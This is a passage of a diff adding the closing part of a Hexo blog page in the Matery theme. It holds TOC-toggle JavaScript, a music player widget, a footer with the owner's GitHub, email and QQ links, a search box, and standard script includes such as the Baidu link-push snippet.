+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="tencent"
+                   type="search"
+                   id="岁月神偷"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='none'
+                   order='list'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="http://LinShiG0ng.github.io" target="_blank">有关部门临时工</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">66.4k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/linshig0ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:450956259@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=450956259" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 450956259" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
